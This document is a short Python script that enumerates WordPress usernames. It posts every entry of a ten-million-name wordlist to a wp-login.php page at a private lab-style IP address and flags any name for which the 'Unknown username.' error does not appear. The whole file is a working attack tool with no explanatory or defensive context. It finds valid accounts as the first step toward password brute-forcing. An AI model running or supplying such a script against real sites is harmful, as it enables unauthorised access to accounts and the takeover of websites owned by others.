import requests

def doThing(url, username, password):

    cookies = {
        'wordpress_test_cookie': 'WP Cookie check'
    }

    data = {
        'log': username,
        'pwd': password,
    }

    r = requests.post(url, cookies=cookies, data=data)

    return r

def check_resp(r, check_for):
    return check_for in r.text


def doWordlist(filename, url, check_for):
    with open(filename, 'r', errors='replace') as file:
        for word in file.readlines():
            word = word.strip()

            username = word
            password = 'bark'
            r = doThing(url, username, password)
            isUnknown = check_resp(r, check_for)
            if isUnknown:
                #print(f'fail -> {username}')
                pass
            else:
                print(f'\n\nSUCCESS!!! ->{username}<-\n\n')



if __name__=='__main__':
    url = 'http://10.13.37.11/wp-login.php'
    filename = '/home/user/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt'
    check_for = 'Unknown username.'

    doWordlist(filename, url, check_for)

